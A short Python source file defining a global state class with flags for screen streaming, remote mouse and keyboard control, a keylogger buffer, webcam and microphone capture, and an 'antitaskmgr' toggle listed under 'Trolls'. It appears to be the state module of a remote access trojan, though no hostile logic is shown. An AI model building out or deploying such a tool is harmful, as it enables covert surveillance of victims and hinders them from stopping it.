import asyncio

class St:
    # Stream
    streaming = False
    quality = 80
    monitor_idx = 0
    stream_fps = 30  # Step 1 Target: 30 FPS
    
    # Input
    mnk_active = False
    cursor_locked = False
    
    # Keylogger
    keylog_active = False
    keylog_data = []
    
    # Camera
    camera_active = False
    camera_idx = 0
    
    # Audio — dual independent streams
    mic_active = False
    mic_device_id = None
    desktop_active = False
    desktop_device_id = None
    
    # Audio Queues for WebRTC integration
    mic_queue = asyncio.Queue(maxsize=100)
    desktop_queue = asyncio.Queue(maxsize=100)
    
    # Adaptive quality
    _latency_ms = 50.0
    _frame_send_times = []
    
    # Trolls / Extra
    antitaskmgr = False

st = St()
